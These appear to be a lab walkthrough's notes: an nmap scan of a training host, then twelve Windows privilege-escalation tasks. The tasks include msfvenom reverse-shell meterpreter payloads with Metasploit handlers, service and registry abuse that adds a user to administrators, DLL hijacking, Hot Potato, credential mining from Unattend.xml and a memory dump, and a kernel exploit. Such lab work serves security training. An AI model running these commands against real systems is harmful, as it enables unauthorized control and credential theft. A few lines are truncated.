```
# Nmap 7.95 scan initiated Wed Jul 30 22:04:24 2025 as: /usr/lib/nmap/nmap -A -sC -sV -oN nmap_blueprint.txt 10.10.37.81
Nmap scan report for 10.10.37.81
Host is up (0.41s latency).
Not shown: 987 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 7.5
|*http-title: 404 - File or directory not found.
| http-methods:
|*  Potentially risky methods: TRACE
|*http-server-header: Microsoft-IIS/7.5
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
443/tcp   open  ssl/http     Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2019-04-11 22:52  oscommerce-2.3.4/
| -     2019-04-11 22:52  oscommerce-2.3.4/catalog/
| -     2019-04-11 22:52  oscommerce-2.3.4/docs/
|*
|_ssl-date: TLS randomness does not represent time
|*http-title: Bad request!
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|Not valid after:  2019-11-08T23:48:47
|http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28
| http-methods:
|  Potentially risky methods: TRACE
| tls-alpn:
|  http/1.1
445/tcp   open  microsoft-ds Windows 7 Home Basic 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3306/tcp  open  mysql        MariaDB 10.3.23 or earlier (unauthorized)
8080/tcp  open  http         Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
|http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2019-04-11 22:52  oscommerce-2.3.4/
| -     2019-04-11 22:52  oscommerce-2.3.4/catalog/
| -     2019-04-11 22:52  oscommerce-2.3.4/docs/
|
| http-methods:
|*  Potentially risky methods: TRACE
|_http-title: Index of /
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49158/tcp open  msrpc        Microsoft Windows RPC
49159/tcp open  msrpc        Microsoft Windows RPC
49160/tcp open  msrpc        Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=7/30%OT=80%CT=1%CU=31844%PV=Y%DS=5%DC=T%G=Y%TM=688A4D2
OS:6%P=x86_64-pc-linux-gnu)SEQ(CI=I%II=I%TS=8)SEQ(SP=105%GCD=1%ISR=10B%TI=I
OS:%CI=I%II=I%SS=O%TS=7)SEQ(SP=107%GCD=1%ISR=105%TI=I%CI=I%TS=7)SEQ(SP=107%
OS:GCD=1%ISR=106%TI=I%II=I%SS=S%TS=8)SEQ(SP=FC%GCD=1%ISR=10E%TI=I%CI=I%II=I
OS:%SS=S%TS=6)OPS(O1=M508NW8ST11%O2=M508NW8ST11%O3=M508NW8NNT11%O4=M508NW8S
OS:T11%O5=M508NW8ST11%O6=M508ST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=20
OS:00%W6=2000)ECN(R=Y%DF=Y%T=80%W=2000%O=M508NW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=8
OS:0%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(
OS:R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F
OS:=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%
OS:T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD
OS:=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=Z%RUCK=0%RUD=G)IE
OS:(R=Y%DFI=N%T=80%CD=Z)
Network Distance: 5 hops
Service Info: Hosts: www.example.com, BLUEPRINT, localhost; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -20m07s, deviation: 34m37s, median: -8s
| smb2-time:
|   date: 2025-07-30T16:49:19
|_  start_date: 2025-07-30T16:30:41
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2:1:0:
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: BLUEPRINT, NetBIOS user: <unknown>, NetBIOS MAC: 02:b2:63:53:16:51 (unknown)
| smb-os-discovery:
|   OS: Windows 7 Home Basic 7601 Service Pack 1 (Windows 7 Home Basic 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1
|   Computer name: BLUEPRINT
|   NetBIOS computer name: BLUEPRINT\\x00
|   Workgroup: WORKGROUP\\x00
|_  System time: 2025-07-30T17:49:16+01:00

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   70.03 ms  10.17.0.1
2   ... 4
5   467.98 ms 10.10.37.81

OS and Service detection performed. Please report any incorrect results at <https://nmap.org/submit/> .
# Nmap done at Wed Jul 30 22:19:42 2025 -- 1 IP address (1 host up) scanned in 918.16 seconds

```

Task 1 Registry Escalation - Autorun

```
Detection

Windows VM

	1. Open command prompt and type: C:\\Users\\User\\Desktop\\Tools\\Autoruns\\Autoruns64.exe
	2. In Autoruns, click on the ‘Logon’ tab.
	3. From the listed results, notice that the “My Program” entry is pointing to “C:\\Program Files\\Autorun Program\\program.exe”.
	4. In command prompt type: C:\\Users\\User\\Desktop\\Tools\\Accesschk\\accesschk64.exe -wvu "C:\\Program Files\\Autorun Program"
	5. From the output, notice that the “Everyone” user group has “FILE_ALL_ACCESS” permission on the “program.exe” file.

Exploitation

Kali VM

	1. Open command prompt and type: msfconsole
	2. In Metasploit (msf > prompt) type: use multi/handler
	3. In Metasploit (msf > prompt) type: set payload windows/meterpreter/reverse_tcp
	4. In Metasploit (msf > prompt) type: set lhost [Kali VM IP Address]
	5. In Metasploit (msf > prompt) type: run
	6. Open an additional command prompt and type: msfvenom -p windows/meterpreter/reverse_tcp lhost=[Kali VM IP Address] -f exe -o program.exe
	7. Copy the generated file, program.exe, to the Windows VM.
	8. Open a python server.

Windows VM

	1. Place program.exe in ‘C:\\Program Files\\Autorun Program’.
	2.By Dwonloading from python server.

Kali VM

	1. Wait for a new session to open in Metasploit.
	2. In Metasploit (msf > prompt) type: sessions -i [Session ID]
	3. To confirm that the attack succeeded, in Metasploit (msf > prompt) type: getuid

```

Task 2 Registry Escalation - AlwaysInstallElevated

```
Detection

Windows VM

	1.Open command prompt and type: reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer
	2.From the output, notice that “AlwaysInstallElevated” value is 1.
	3.In command prompt type: reg query HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer
	4.From the output, notice that “AlwaysInstallElevated” value is 1.

Exploitation

Kali VM

	1. Open command prompt and type: msfconsole
	2. In Metasploit (msf > prompt) type: use multi/handler
	3. In Metasploit (msf > prompt) type: set payload windows/meterpreter/reverse_tcp
	4. In Metasploit (msf > prompt) type: set lhost [Kali VM IP Address]
	5. In Metasploit (msf > prompt) type: run
	6. Open an additional command prompt and type: msfvenom -p windows/meterpreter/reverse_tcp lhost=[Kali VM IP Address] -f msi -o setup.msi
	7. Copy the generated file, setup.msi, to the Windows VM.

Windows VM

	1.Place ‘setup.msi’ in ‘C:\\Temp’.
	2.Open command prompt and type: msiexec /quiet /qn /i C:\\Temp\\setup.msi

Enjoy your shell! :)

```

Task 3 Service Escalation - Registry
Detection

```
Windows VM

	1. Open powershell prompt and type: Get-Acl -Path hklm:\\System\\CurrentControlSet\\services\\regsvc | fl
	2. Notice that the output suggests that user belong to “NT AUTHORITY\\INTERACTIVE” has “FullContol” permission over the registry key.

Exploitation

Windows VM

Kali VM

	1. Open windows_service.c in a text editor and replace the command used by the system() function to: cmd.exe /k net localgroup administrators user /add
	2. Exit the text editor and compile the file by typing the following in the command prompt: x86_64-w64-mingw32-gcc windows_service.c -o x.exe (NOTE: if this is not installed, use 'sudo apt install gcc-mingw-w64')
	3. Copy the generated file x.exe, to the Windows VM.

Windows VM

	1. Place x.exe in ‘C:\\Temp’.
	2. Open command prompt at type: reg add HKLM\\SYSTEM\\CurrentControlSet\\services\\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\\temp\\x.exe /f
	3. In the command prompt type: sc start regsvc
	4. It is possible to confirm that the user was added to the local administrators group by typing the following in the command prompt: net localgroup administrators

```

Task 4 Service Escalation - Executable Files
Detection

```
Windows VM

	1. Open command prompt and type: C:\\Users\\User\\Desktop\\Tools\\Accesschk\\accesschk64.exe -wvu "C:\\Program Files\\File Permissions Service"
	2. Notice that the “Everyone” user group has “FILE_ALL_ACCESS” permission on the filepermservice.exe file.

Exploitation

Windows VM

	1. Open command prompt and type: copy /y c:\\Temp\\x.exe "c:\\Program Files\\File Permissions Service\\filepermservice.exe"
	2. In command prompt type: sc start filepermsvc
	3. It is possible to confirm that the user was added to the local administrators group by typing the following in the command prompt: net localgroup administrators

```

Task 5 Privilege Escalation - Startup Applications

```
Detection

Windows VM

	1. Open command prompt and type: icacls.exe "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
	2. From the output notice that the “BUILTIN\\Users” group has full access ‘(F)’ to the directory.

Exploitation

Kali VM

	1. Open command prompt and type: msfconsole
	2. In Metasploit (msf > prompt) type: use multi/handler
	3. In Metasploit (msf > prompt) type: set payload windows/meterpreter/reverse_tcp
	4. In Metasploit (msf > prompt) type: set lhost [Kali VM IP Address]
	5. In Metasploit (msf > prompt) type: run
	6. Open another command prompt and type: msfvenom -p windows/meterpreter/reverse_tcp LHOST=[Kali VM IP Address] -f exe -o x.exe
	7. Copy the generated file, x.exe, to the Windows VM.

Windows VM

	1. Place x.exe in “C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup”.
	2. Logoff.
	3. Login with the administrator account credentials.

Kali VM

	1. Wait for a session to be created, it may take a few seconds.
	2. In Meterpreter(meterpreter > prompt) type: getuid
	3. From the output, notice the user is “User-PC\\Admin”

```

Task 6 Service Escalation - DLL Hijacking

```
Detection

Windows VM

	1. Open the Tools folder that is located on the desktop and then go the Process Monitor folder.
	2. In reality, executables would be copied from the victim’s host over to the attacker’s host for analysis during run time. Alternatively,
		the same software can be installed on the attacker’s host for analysis, in case they can obtain it. To simulate this, right click on Procmon.exe and select ‘Run as administrator’ from the menu.
	3. In procmon, select "filter".  From the left-most drop down menu, select ‘Process Name’.
	4. In the input box on the same line type: dllhijackservice.exe
	5. Make sure the line reads “Process Name is dllhijackservice.exe then Include” and click on the ‘Add’ button, then ‘Apply’ and lastly on ‘OK’.
	6. Next, select from the left-most drop down menu ‘Result’.
	7. In the input box on the same line type: NAME NOT FOUND
	8. Make sure the line reads “Result is NAME NOT FOUND then Include” and click on the ‘Add’ button, then ‘Apply’ and lastly on ‘OK’.
	9. Open command prompt and type: sc start dllsvc
	10. Scroll to the bottom of the window. One of the highlighted results shows that the service tried to execute ‘C:\\Temp\\hijackme.dll’ yet it could not do that as the file was not found.
		Note that ‘C:\\Temp’ is a writable location.

Exploitation

Windows VM

	y ‘C:\\Users\\User\\Desktop\\Tools\\Source\\windows_dll.c’ to the Kali VM.

Kali VM

	1. Open windows_dll.c in a text editor and replace the command used by the system() function to: cmd.exe /k net localgroup administrators user /add
	2. Exit the text editor and compile the file by typing the following in the command prompt: x86_64-w64-mingw32-gcc windows_dll.c -shared -o hijackme.dll
	3. Copy the generated file hijackme.dll, to the Windows VM.

Windows VM

	1. Place hijackme.dll in ‘C:\\Temp’.
	2. Open command prompt and type: sc stop dllsvc & sc start dllsvc
	3. It is possible to confirm that the user was added to the local administrators group by typing the following in the command prompt: net localgroup administrators

```

Task 7 Service Escalation - binPath

```
Detection

Windows VM

	1. Open command prompt and type: C:\\Users\\User\\Desktop\\Tools\\Accesschk\\accesschk64.exe -wuvc daclsvc
	2. Notice that the output suggests that the user “User-PC\\User” has the “SERVICE_CHANGE_CONFIG” permission.

Exploitation

Windows VM

	1. In command prompt type: sc config daclsvc binpath= "net localgroup administrators user /add"
	2. In command prompt type: sc start daclsvc
	3. It is possible to confirm that the user was added to the local administrators group by typing the following in the command prompt: net localgroup administrators

```

Task 8 Service Escalation - Unquoted Service Paths

```
Detection

Windows VM

	1. Open command prompt and type: sc qc unquotedsvc
	2. Notice that the “BINARY_PATH_NAME” field displays a path that is not confined between quotes.

Exploitation

Kali VM

	1. Open command prompt and type: msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o common.exe
	2. Copy the generated file, common.exe, to the Windows VM.

Windows VM

	1. Place common.exe in ‘C:\\Program Files\\Unquoted Path Service’.
	2. Open command prompt and type: sc start unquotedsvc
	3. It is possible to confirm that the user was added to the local administrators group by typing the following in the command prompt: net localgroup administrators

```

Task 9 Potato Escalation - Hot Potato

```
Exploitation

Windows VM

	1. In command prompt type: powershell.exe -nop -ep bypass
	2. In Power Shell prompt type: Import-Module C:\\Users\\User\\Desktop\\Tools\\Tater\\Tater.ps1
	3. In Power Shell prompt type: Invoke-Tater -Trigger 1 -Command "net localgroup administrators user /add"
	4. To confirm that the attack was successful, in Power Shell prompt type: net localgroup administrators

```

Task 10 Password Mining Escalation - Configuration Files

```
Exploitation

Windows VM

	1. Open command prompt and type: notepad C:\\Windows\\Panther\\Unattend.xml
	2. Scroll down to the “<Password>” property and copy the base64 string that is confined between the “<Value>” tags underneath it.

Kali VM

	1. In a terminal, type: echo [copied base64] | base64 -d
	2. Notice the cleartext password

Answer the questions below

	What is the cleartext password found in Unattend.xml?
		password123

```

Task 11 Password Mining Escalation - Memory

```
Exploitation

Kali VM

	1.Open command prompt and type: msfconsole
	2.In Metasploit (msf > prompt) type: use auxiliary/server/capture/http_basic
	3.In Metasploit (msf > prompt) type: set uripath x
	4.In Metasploit (msf > prompt) type: run

Windows VM

	1.Open Internet Explorer and browse to: http://[Kali VM IP Address]/x
	2.Open command prompt and type: taskmgr
	3.In Windows Task Manager, right-click on the “iexplore.exe” in the “Image Name” columnand select “Create Dump File” from the popup menu.
	4.Copy the generated file, iexplore.DMP, to the Kali VM.

Kali VM

	1.Place ‘iexplore.DMP’ on the desktop.
	2.Open command prompt and type: strings /root/Desktop/iexplore.DMP | grep "Authorization: Basic"
	3.Select the Copy the Base64 encoded string.
	4.In command prompt type: echo -ne [Base64 String] | base64 -d
	5.Notice the credentials in the output.

```

Task 12 Privilege Escalation - Kernel Exploits

```
Establish a shell

Kali VM

	1. Open command prompt and type: msfconsole
	2. In Metasploit (msf > prompt) type: use multi/handler
	3. In Metasploit (msf > prompt) type: set payload windows/meterpreter/reverse_tcp
	4. In Metasploit (msf > prompt) type: set lhost [Kali VM IP Address]
	5. In Metasploit (msf > prompt) type: run
	6. Open an additional command prompt and type: msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=[Kali VM IP Address] -f exe > shell.exe
	7. Copy the generated file, shell.exe, to the Windows VM.

Windows VM

	ecute shell.exe and obtain reverse shell

Detection & Exploitation

Kali VM

	1. In Metasploit (msf > prompt) type: run post/multi/recon/local_exploit_suggester
	2. Identify exploit/windows/local/ms16_014_wmi_recv_notif as a potential privilege escalation
	3. In Metasploit (msf > prompt) type: use exploit/windows/local/ms16_014_wmi_recv_notif
	4. In Metasploit (msf > prompt) type: set SESSION [meterpreter SESSION number]
	5. In Metasploit (msf > prompt) type: set LPORT 5555
	6. In Metasploit (msf > prompt) type: run

NOTE: The shell might default to your eth0 during this attack.  If so, ensure you type set lhost [Kali VM IP Address] and run again.

```